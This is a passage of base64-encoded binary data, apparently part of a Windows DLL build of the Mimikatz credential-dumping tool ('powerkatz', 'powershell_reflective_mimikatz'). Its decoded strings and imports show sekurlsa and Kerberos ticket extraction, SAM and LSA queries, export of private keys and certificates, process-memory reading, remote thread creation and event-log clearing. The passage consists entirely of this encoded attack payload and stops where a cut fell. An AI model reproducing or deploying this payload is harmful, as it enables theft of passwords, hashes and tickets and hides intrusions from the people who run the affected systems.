AAAAoACQAgACoAIABGAGwAYQBnAHMAIAAgACAAIAA6ACAAJQAwADIAeAAvAE4AJQAwADIAeAAvAEwAJQAwADIAeAAvAFMAJQAwADIAeAAvACUAMAAyAHgALwAlADAAMgB4AC8AJQAwADIAeAAvACUAMAAyAHgAAAAAAAoACQAgACoAIAB1AG4AawBuAG8AdwAgACAAIAA6ACAAAAAAAFsAMAAuAC4AMABdAAAAAAAKAAkAIAAqACAAUgBhAHcAIABkAGEAdABhACAAOgAgAAAAAAAKAAkAIAAqACAAUABJAE4AIABjAG8AZABlACAAOgAgACUAdwBaAAAACQAgACAAIAAlAHMAIAAAADwAbgBvACAAcwBpAHoAZQAsACAAYgB1AGYAZgBlAHIAIABpAHMAIABpAG4AYwBvAHIAcgBlAGMAdAA+AAAAAAAlAHcAWgAJACUAdwBaAAkAAAAAAAAAAAAKAAkAIAAqACAAVQBzAGUAcgBuAGEAbQBlACAAOgAgACUAdwBaAAoACQAgACoAIABEAG8AbQBhAGkAbgAgACAAIAA6ACAAJQB3AFoACgAJACAAKgAgAFAAYQBzAHMAdwBvAHIAZAAgADoAIAAAAAAATABVAEkARAAgAEsATwAKAAAAAAAKAAkAIAAqACAAUgBvAG8AdABLAGUAeQAgACAAOgAgAAAAAAAKAAkAIAAqACAARABQAEEAUABJACAAIAAgACAAOgAgAAAAAAAKAAkAIAAqACAAJQAwADgAeAAgADoAIAAAAAAACgAJACAAWwAlADAAOAB4AF0AAABkAHAAYQBwAGkAcwByAHYALgBkAGwAbAAAAAAACQAgAFsAJQAwADgAeABdAAoACQAgACoAIABHAFUASQBEACAAIAAgACAAIAAgADoACQAAAAoACQAgACoAIABUAGkAbQBlACAAIAAgACAAIAAgADoACQAAAAoACQAgACoAIABNAGEAcwB0AGUAcgBLAGUAeQAgADoACQAAAAoACQBLAE8AAAAAAFQAaQBjAGsAZQB0ACAARwByAGEAbgB0AGkAbgBnACAAVABpAGMAawBlAHQAAAAAAEMAbABpAGUAbgB0ACAAVABpAGMAawBlAHQAIAA/AAAAVABpAGMAawBlAHQAIABHAHIAYQBuAHQAaQBuAGcAIABTAGUAcgB2AGkAYwBlAAAAawBlAHIAYgBlAHIAbwBzAC4AZABsAGwAAAAAAAoACQBHAHIAbwB1AHAAIAAlAHUAIAAtACAAJQBzAAAACgAJACAAKgAgAEsAZQB5ACAATABpAHMAdAAgADoACgAAAAAAZABhAHQAYQAgAGMAbwBwAHkAIABAACAAJQBwAAAAAAAKACAAIAAgAFwAXwAgACUAcwAgAAAAAAAtAD4AIAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AZQBuAHUAbQBfAGsAZQByAGIAZQByAG8AcwBfAGMAYQBsAGwAYgBhAGMAawBfAHAAdABoACAAOwAgAGsAdQBsAGwAXwBtAF8AbQBlAG0AbwByAHkAXwBjAG8AcAB5ACAAKAAwAHgAJQAwADgAeAApAAoAAAAKACAAIAAgAFwAXwAgACoAUABhAHMAcwB3AG8AcgBkACAAcgBlAHAAbABhAGMAZQAgAC0APgAgAAAAAABuAHUAbABsAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGsAZQByAGIAZQByAG8AcwBfAGUAbgB1AG0AXwB0AGkAYwBrAGUAdABzACAAOwAgAGsAdQBsAGwAXwBtAF8AZgBpAGwAZQBfAHcAcgBpAHQAZQBEAGEAdABhACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAWwAlAHgAOwAlAHgAXQAtACUAMQB1AC0AJQB1AC0AJQAwADgAeAAtACUAdwBaAEAAJQB3AFoALQAlAHcAWgAuACUAcwAAAAAAWwAlAHgAOwAlAHgAXQAtACUAMQB1AC0AJQB1AC0AJQAwADgAeAAuACUAcwAAAAAAbABpAHYAZQBzAHMAcAAuAGQAbABsAAAAQ3JlZGVudGlhbEtleXMAAFByaW1hcnkACgAJACAAWwAlADAAOAB4AF0AIAAlAFoAAAAAAGQAYQB0AGEAIABjAG8AcAB5ACAAQAAgACUAcAAgADoAIAAAAE8ASwAgACEAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAG0AcwB2AF8AZQBuAHUAbQBfAGMAcgBlAGQAXwBjAGEAbABsAGIAYQBjAGsAXwBwAHQAaAAgADsAIABrAHUAbABsAF8AbQBfAG0AZQBtAG8AcgB5AF8AYwBvAHAAeQAgACgAMAB4ACUAMAA4AHgAKQAKAAAALgAAAAAAAABuAC4AZQAuACAAKABLAEkAVwBJAF8ATQBTAFYAMQBfADAAXwBQAFIASQBNAEEAUgBZAF8AQwBSAEUARABFAE4AVABJAEEATABTACAASwBPACkAAAAAAAAAbgAuAGUALgAgACgASwBJAFcASQBfAE0AUwBWADEAXwAwAF8AQwBSAEUARABFAE4AVABJAEEATABTACAASwBPACkAAAB0AHMAcABrAGcALgBkAGwAbAAAAHcAZABpAGcAZQBzAHQALgBkAGwAbAAAAP7///8AAAAAtP///wAAAAD+////AAAAAIAzARAAAAAAkDEBEKQxARAAAAAA0jEBEOYxARAAAAAAFTIBECkyARAAAAAAWjIBEG4yARAAAAAAiTIBEJ0yARAAAAAAvjIBENIyARAAAAAAAzMBEBczARAAAAAASjMBEF4zARAAAAAA/v///wAAAADY////AAAAAP7////aZAEQ7mQBEBicAgAAAAAAAAAAAIikAgAAkAEACJ0CAAAAAAAAAAAAvKUCAPCQAQDEngIAAAAAAAAAAAAopgIArJIBAISeAgAAAAAAAAAAAGymAgBskgEAQJ4CAAAAAAAAAAAAqqcCACiSAQCUngIAAAAAAAAAAABAqAIAfJIBAHyeAgAAAAAAAAAAAGKoAgBkkgEArJ4CAAAAAAAAAAAAhKgCAJSSAQC0ngIAAAAAAAAAAACyqAIAnJIBAHSfAgAAAAAAAAAAAJyqAgBckwEAOJ0CAAAAAAAAAAAAnK4CACCRAQDgngIAAAAAAAAAAABmrwIAyJIBAAAAAAAAAAAAAAAAAAAAAAAAAAAA9J8CABCgAgAgoAIALKACAEKgAgBcoAIAdKACAIigAgCcoAIArKACALygAgDMoAIA2qACAPCgAgAAoQIAEqECACKhAgAyoQIASqECAFyhAgBsoQIAhqECAJqhAgCwoQIAxKECAN6hAgDwoQIACKICAByiAgAyogIASKICAFyiAgBuogIAgKICAJCiAgCuogIAwKICANKiAgDuogIACqMCACijAgBEowIATqMCAGKjAgB2owIAiqMCAJ6jAgCwowIAxKMCANajAgDmowIA+qMCAAqkAgAapAIALKQCAD6kAgBSpAIAaqQCAHakAgAAAAAAlqQCAK6kAgDSpAIA6KQCAPikAgAWpQIAOqUCAEylAgBwpQIAjqUCAKSlAgAAAAAAcrECAGKxAgBIsQIAKrECAA6xAgD6sAIA3LACAMawAgC6sAIApLACAIauAgByrgIAWq4CAEiuAgAqrgIADK4CAPytAgDgrQIA2K0CAMStAgCyrQIAoq0CAJStAgCErQIAeK0CAGKtAgBIrQIANq0CABytAgAKrQIA+KwCAOKsAgDMrAIAvKwCAKqsAgCarAIAhKwCAHKsAgBirAIATKwCADqsAgAorAIAFKwCAASsAgDwqwIA4KsCAM6rAgDAqwIAsKsCAJ6rAgCMqwIAeqsCAGqrAgBcqwIASKsCADqrAgAiqwIAEqsCAKaqAgC+qgIAzKoCANiqAgDkqgIA8KoCAP6qAgAAAAAALqcCAGanAgB0pwIAkqcCAFCnAgAgpwIAEKcCAPimAgDepgIA0KYCAHimAgCSpgIApKYCALSmAgAAAAAATKgCAAAAAABIpgIANqYCAFymAgAAAAAA2KcCAAqoAgAgqAIAtqcCAO6nAgAAAAAAbqgCAAAAAACcqAIAqKgCAJCoAgAAAAAA2qUCAB6mAgASpgIABqYCAPKlAgDIpQIAAAAAAHyvAgCQsAIAhrACAHqwAgBysAIAZrACAFiwAgBOsAIAQrACADawAgAssAIAIrACABqwAgAOsAIAALACAPSvAgDmrwIA1q8CAMyvAgAOrwIAGK8CACSvAgAurwIAOK8CAEKvAgBKrwIAVK8CAFyvAgByrwIAwq8CAIavAgCUrwIAnq8CAKqvAgC4rwIAmrACAAAAAAAErwIAqqkCAPCuAgDkrgIA2K4CAMyuAgDCrgIAuK4CAKquAgCWqQIAgKkCAGSpAgBQqQIANKkCACSpAgAMqQIA9KgCAOCoAgDAqAIAwqkCANypAgD2qQIAGKoCADiqAgBKqgIAYKoCAHSqAgCKqgIA+q4CAIixAgCSsQIAAAAAAH0BTHNhUXVlcnlJbmZvcm1hdGlvblBvbGljeQB1AUxzYU9wZW5Qb2xpY3kAVgFMc2FDbG9zZQAAZwBDcmVhdGVXZWxsS25vd25TaWQAAGEAQ3JlYXRlUHJvY2Vzc1dpdGhMb2dvblcAYABDcmVhdGVQcm9jZXNzQXNVc2VyVwAA+AFSZWdRdWVyeVZhbHVlRXhXAADyAVJlZ1F1ZXJ5SW5mb0tleVcAAOIBUmVnRW51bVZhbHVlVwDtAVJlZ09wZW5LZXlFeFcA3wFSZWdFbnVtS2V5RXhXAMsBUmVnQ2xvc2VLZXkAPgBDbG9zZVNlcnZpY2VIYW5kbGUAAK8ARGVsZXRlU2VydmljZQCuAU9wZW5TQ01hbmFnZXJXAACwAU9wZW5TZXJ2aWNlVwAATAJTdGFydFNlcnZpY2VXAMQBUXVlcnlTZXJ2aWNlU3RhdHVzRXgAAEIAQ29udHJvbFNlcnZpY2UAADsBSXNUZXh0VW5pY29kZQBQAENvbnZlcnRTaWRUb1N0cmluZ1NpZFcAAKwBT3BlblByb2Nlc3NUb2tlbgAAGgFHZXRUb2tlbkluZm9ybWF0aW9uAEoBTG9va3VwQWNjb3VudFNpZFcAWABDb252ZXJ0U3RyaW5nU2lkVG9TaWRXAACUAENyeXB0RXhwb3J0S2V5AACGAENyeXB0QWNxdWlyZUNvbnRleHRXAACaAENyeXB0R2V0S2V5UGFyYW0AAKAAQ3J5cHRSZWxlYXNlQ29udGV4dACTAENyeXB0RW51bVByb3ZpZGVyc1cAmwBDcnlwdEdldFByb3ZQYXJhbQCMAENyeXB0RGVzdHJveUtleQCcAENyeXB0R2V0VXNlcktleQCrAU9wZW5FdmVudExvZ1cABAFHZXROdW1iZXJPZkV2ZW50TG9nUmVjb3JkcwAAOgBDbGVhckV2ZW50TG9nVwAAZQBDcmVhdGVTZXJ2aWNlVwAAQwJTZXRTZXJ2aWNlT2JqZWN0U2VjdXJpdHkAACoAQnVpbGRTZWN1cml0eURlc2NyaXB0b3JXAADCAVF1ZXJ5U2VydmljZU9iamVjdFNlY3VyaXR5AAAdAEFsbG9jYXRlQW5kSW5pdGlhbGl6ZVNpZAAA4gBGcmVlU2lkAJkAQ3J5cHRHZXRIYXNoUGFyYW0AogBDcnlwdFNldEtleVBhcmFtAABwAlN5c3RlbUZ1bmN0aW9uMDMyAFUCU3lzdGVtRnVuY3Rpb24wMDUAnwBDcnlwdEltcG9ydEtleQAAaQJTeXN0ZW1GdW5jdGlvbjAyNQCIAENyeXB0Q3JlYXRlSGFzaACJAENyeXB0RGVjcnlwdAAAiwBDcnlwdERlc3Ryb3lIYXNoAABkAUxzYUZyZWVNZW1vcnkAnQBDcnlwdEhhc2hEYXRhALEBT3BlblRocmVhZFRva2VuAEUCU2V0VGhyZWFkVG9rZW4AALQARHVwbGljYXRlVG9rZW5FeAAAOABDaGVja1Rva2VuTWVtYmVyc2hpcAAAbABDcmVkRnJlZQAAawBDcmVkRW51bWVyYXRlVwAAQURWQVBJMzIuZGxsAAB3AENyeXB0QmluYXJ5VG9TdHJpbmdXAAB0AENyeXB0QWNxdWlyZUNlcnRpZmljYXRlUHJpdmF0ZUtleQBGAENlcnRHZXROYW1lU3RyaW5nVwAAUABDZXJ0T3BlblN0b3JlADwAQ2VydEZyZWVDZXJ0aWZpY2F0ZUNvbnRleHQAAAQAQ2VydEFkZENlcnRpZmljYXRlQ29udGV4dFRvU3RvcmUAAA8AQ2VydENsb3NlU3RvcmUAAEEAQ2VydEdldENlcnRpZmljYXRlQ29udGV4dFByb3BlcnR5ACkAQ2VydEVudW1DZXJ0aWZpY2F0ZXNJblN0b3JlACwAQ2VydEVudW1TeXN0ZW1TdG9yZQAJAVBGWEV4cG9ydENlcnRTdG9yZUV4AABDUllQVDMyLmRsbAAFAENETG9jYXRlQ1N5c3RlbQAEAENER2VuZXJhdGVSYW5kb21CaXRzAAAGAENETG9jYXRlQ2hlY2tTdW0AAAsATUQ1RmluYWwAAA0ATUQ1VXBkYXRlAAwATUQ1SW5pdABjcnlwdGRsbC5kbGwAAE4AUGF0aElzUmVsYXRpdmVXACIAUGF0aENhbm9uaWNhbGl6ZVcAJABQYXRoQ29tYmluZVcAAFNITFdBUEkuZGxsACYAU2FtUXVlcnlJbmZvcm1hdGlvblVzZXIABgBTYW1DbG9zZUhhbmRsZQAAFABTYW1GcmVlTWVtb3J5ABMAU2FtRW51bWVyYXRlVXNlcnNJbkRvbWFpbgAhAFNhbU9wZW5Vc2VyAB0AU2FtTG9va3VwTmFtZXNJbkRvbWFpbgAAHABTYW1Mb29rdXBJZHNJbkRvbWFpbgAAHwBTYW1PcGVuRG9tYWluAAcAU2FtQ29ubmVjdAAAEQBTYW1FbnVtZXJhdGVEb21haW5zSW5TYW1TZXJ2ZXIAABgAU2FtR2V0R3JvdXBzRm9yVXNlcgAsAFNhbVJpZFRvU2lkABsAU2FtTG9va3VwRG9tYWluSW5TYW1TZXJ2ZXIAABUAU2FtR2V0QWxpYXNNZW1iZXJzaGlwAFNBTUxJQi5kbGwAACgATHNhTG9va3VwQXV0aGVudGljYXRpb25QYWNrYWdlAAAlAExzYUZyZWVSZXR1cm5CdWZmZXIAIwBMc2FEZXJlZ2lzdGVyTG9nb25Qcm9jZXNzACIATHNhQ29ubmVjdFVudHJ1c3RlZAAhAExzYUNhbGxBdXRoZW50aWNhdGlvblBhY2thZ2UAAFNlY3VyMzIuZGxsAAcAQ29tbWFuZExpbmVUb0FyZ3ZXAABTSEVMTDMyLmRsbACYAUlzQ2hhckFscGhhTnVtZXJpY1cAVVNFUjMyLmRsbAAABQBNRDRVcGRhdGUAAwBNRDRGaW5hbAAABABNRDRJbml0AGFkdmFwaTMyLmRsbAAAFABSdGxVbmljb2RlU3RyaW5nVG9BbnNpU3RyaW5nAAANAFJ0bEZyZWVBbnNpU3RyaW5nABIAUnRsSW5pdFVuaWNvZGVTdHJpbmcAAAwAUnRsRXF1YWxVbmljb2RlU3RyaW5nAAEATnRRdWVyeU9iamVjdAACAE50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbgAADwBSdGxHZXRDdXJyZW50UGViAAAAAE50UXVlcnlJbmZvcm1hdGlvblByb2Nlc3MACQBSdGxDcmVhdGVVc2VyVGhyZWFkABMAUnRsU3RyaW5nRnJvbUdVSUQADgBSdGxGcmVlVW5pY29kZVN0cmluZwAAEABSdGxHZXROdFZlcnNpb25OdW1iZXJzAAAWAFJ0bFVwY2FzZVVuaWNvZGVTdHJpbmcAAAgAUnRsQXBwZW5kVW5pY29kZVN0cmluZ1RvU3RyaW5nAAAHAFJ0bEFuc2lTdHJpbmdUb1VuaWNvZGVTdHJpbmcAAAMATnRSZXN1bWVQcm9jZXNzAAYAUnRsQWRqdXN0UHJpdmlsZWdlAAAEAE50U3VzcGVuZFByb2Nlc3MAAAUATnRUZXJtaW5hdGVQcm9jZXNzAAALAFJ0bEVxdWFsU3RyaW5nAABudGRsbC5kbGwAxQBGaWxlVGltZVRvU3lzdGVtVGltZQAAWAJMb2NhbEFsbG9jAABcAkxvY2FsRnJlZQClA1dyaXRlRmlsZQC1AlJlYWRGaWxlAABWAENyZWF0ZUZpbGVXAO4ARmx1c2hGaWxlQnVmZmVycwAAZAFHZXRGaWxlU2l6ZUV4AEEBR2V0Q3VycmVudERpcmVjdG9yeVcAADQAQ2xvc2VIYW5kbGUAQgFHZXRDdXJyZW50UHJvY2VzcwCGAk9wZW5Qcm9jZXNzAHEBR2V0TGFzdEVycm9yAACTAER1cGxpY2F0ZUhhbmRsZQCKAERldmljZUlvQ29udHJvbAAcA1NldEZpbGVQb2ludGVyAACJA1ZpcnR1YWxRdWVyeQAAhANWaXJ0dWFsRnJlZQCKA1ZpcnR1YWxRdWVyeUV4AACFA1ZpcnR1YWxGcmVlRXgAuAJSZWFkUHJvY2Vzc01lbW9yeQCCA1ZpcnR1YWxBbGxvYwAAiANWaXJ0dWFsUHJvdGVjdEV4AACDA1ZpcnR1YWxBbGxvY0V4AACHA1ZpcnR1YWxQcm90ZWN0AACuA1dyaXRlUHJvY2Vzc01lbW9yeQAAaAJNYXBWaWV3T2ZGaWxlAHIDVW5tYXBWaWV3T2ZGaWxlAFUAQ3JlYXRlRmlsZU1hcHBpbmdXAABfAkxvY2FsUmVBbGxvYwAAaQBDcmVhdGVQcm9jZXNzVwAAKQNTZXRMYXN0RXJyb3IAAJEDV2FpdEZvclNpbmdsZU9iamVjdABqAENyZWF0ZVJlbW90ZVRocmVhZAAASAFHZXREYXRlRm9ybWF0VwAA4QFHZXRUaW1lRm9ybWF0VwAAxABGaWxlVGltZVRvTG9jYWxGaWxlVGltZQDVAEZpbmRGaXJzdEZpbGVXAADKAUdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lAGEBR2V0RmlsZUF0dHJpYnV0ZXNXAADOAEZpbmRDbG9zZQDdAEZpbmROZXh0RmlsZVcA+ABGcmVlTGlicmFyeQBVAkxvYWRMaWJyYXJ5VwAAoAFHZXRQcm9jQWRkcmVzcwAAggFHZXRNb2R1bGVIYW5kbGVXAABXA1NsZWVwAPICU2V0Q29uc29sZUN1cnNvclBvc2l0aW9uAAC5AUdldFN0ZEhhbmRsZQAAyABGaWxsQ29uc29sZU91dHB1dENoYXJhY3RlclcANwFHZXRDb25zb2xlU2NyZWVuQnVmZmVySW5mbwAAQwJJc1dvdzY0UHJvY2VzcwAACwNTZXRDdXJyZW50RGlyZWN0b3J5VwAARQFHZXRDdXJyZW50VGhyZWFkAABDAUdldEN1cnJlbnRQcm9jZXNzSWQAS0VSTkVMMzIuZGxsAAAcBV92c2N3cHJpbnRmAHEFd2NzcmNocgBoBXdjc2NocgAAHwVfd2NzaWNtcAAAEgVfc3RyaWNtcAAAIQVfd2NzbmljbXAAcwV3Y3NzdHIAAHYFd2NzdG91bAB0BXdjc3RvbAAAVgFfZXJybm8AAEIFdmZ3cHJpbnRmAJUEZmZsdXNoAAAnBF93Zm9wZW4AbwFfZmlsZW5vANsBX2lvYgAAkgRmY2xvc2UAAKYEZnJlZQAA6gNfd2NzZHVwAG1zdmNydC5kbGwAAO4EbWVtc2V0AADqBG1lbWNweQAAagBfWGNwdEZpbHRlcgDeBG1hbGxvYwAA1QFfaW5pdHRlcm0AAQFfYW1zZ19leGl0AACFBGNhbGxvYwAAwARpc2RpZ2l0AOcEbWJ0b3djAACwAF9fbWJfY3VyX21heAAAwgRpc2xlYWRieXRlAADVBGlzeGRpZ2l0AADZBGxvY2FsZWNvbnYAAC8DX3NucHJpbnRmADECX2l0b2EAbgV3Y3RvbWIAAJQEZmVycm9yAADMBGlzd2N0eXBlAABpBXdjc3RvbWJzAAD/BHJlYWxsb2MAhQBfX2JhZGlvaW5mbwDPAF9fcGlvaW5mbwAEA19yZWFkAEsCX2xzZWVraTY0AEgEX3dyaXRlAADeAV9pc2F0dHkAPQV1bmdldGMAAI0CT3V0cHV0RGVidWdTdHJpbmdBAADXAlJ0bFVud2luZAApAkludGVybG9ja2VkRXhjaGFuZ2UAJgJJbnRlcmxvY2tlZENvbXBhcmVFeGNoYW5nZQAAXwNUZXJtaW5hdGVQcm9jZXNzAABvA1VuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAASwNTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAowJRdWVyeVBlcmZvcm1hbmNlQ291bnRlcgDfAUdldFRpY2tDb3VudAAARgFHZXRDdXJyZW50VGhyZWFkSWQAAAIFX2Noa3N0awAABV9hdWxscmVtAAAAAAAAAAAb3eJUAAAAANKxAgABAAAAAQAAAAEAAADIsQIAzLECANCxAgAOTAAA4LECAAAAcG93ZXJrYXR6LmRsbABwb3dlcnNoZWxsX3JlZmxlY3RpdmVfbWltaWthdHoAAE7mQLuxGb9EAA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